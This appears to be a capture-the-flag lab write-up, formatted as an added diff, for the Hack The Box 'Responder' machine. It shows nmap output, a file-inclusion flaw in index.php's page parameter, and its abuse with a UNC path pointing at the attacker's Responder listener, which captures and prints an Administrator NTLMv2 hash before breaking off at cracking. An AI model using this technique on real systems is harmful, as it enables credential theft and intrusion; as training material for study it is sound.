@@ -1,0 +1,49 @@
+┌──(kali㉿kali)-[~/htb]
+└─$ nmap -sV -sC 10.129.*.* -p-
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-09 10:04 EDT
+Nmap scan report for 10.129.*.*
+Host is up (0.052s latency).
+Not shown: 65533 filtered tcp ports (no-response)
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 323.75 seconds
+
+To solve the machine we have to check a webpage again...BUT!
+Since i cant load the webpage somehow (unika.htb), i had to add to my hosts...
+sudo nano /etc/hosts
+and add this line:
+10.129.*.*    unika.htb
+
+OKay after we can open the webpage we have to figure out the weakness of the page...Remember the earlier ask:
+"What is the name of the URL parameter which is used to load different language versions of the webpage?"
+If we change the languauge to French, the URL will be:
+http://unika.htb/index.php?page=french.html
+So lets play with this a little...type this into the browser:
+http://unika.htb/index.php?page=contact.php
+we got an error:
+Warning: include(contact.php): Failed to open stream: No such file or directory in C:\xampp\htdocs\index.php on line 11
+
+Warning: include(): Failed opening 'contact.php' for inclusion (include_path='\xampp\php\PEAR') in C:\xampp\htdocs\index.php on line 11
+
+So maybe we have a weakness here...the server uses the include() funcion...maybe we can catch a hash here...
+Lets set up the responder:
+┌──(kali㉿kali)-[~]
+└─$ ip addr show tun0
+sudo responder -I tun0
+
+After it started lets copy this into the browser:
+http://unika.htb/index.php?page=//MYIP/test
+
+and we catch a hash:
+[SMB] NTLMv2-SSP Client   : 10.129.*.*
+[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
+[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:906a2b19adc936fe:FF29D66A31760F0DE9CDB5AC4E1898B9:0101000000000000805B7FF1B1AFDC016C8D89FE87D2020A0000000002000800360036005800370001001E00570049004E002D00380037005A004E0053003200560044004C005200520004003400570049004E002D00380037005A004E0053003200560044004C00520052002E0036003600580037002E004C004F00430041004C000300140036003600580037002E004C004F00430041004C000500140036003600580037002E004C004F00430041004C0007000800805B7FF1B1AFDC0106000400020000000800300030000000000000000100000000200000F3577D4A19A7014741398BDF2A25B3E14915853460E19E6AE75AB33A9F974F870A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310035002E0033000000000000000000  
+all we have to do is decrypt it...so lets save it as a txt like hash.txt
+lets use john the ripper:
+
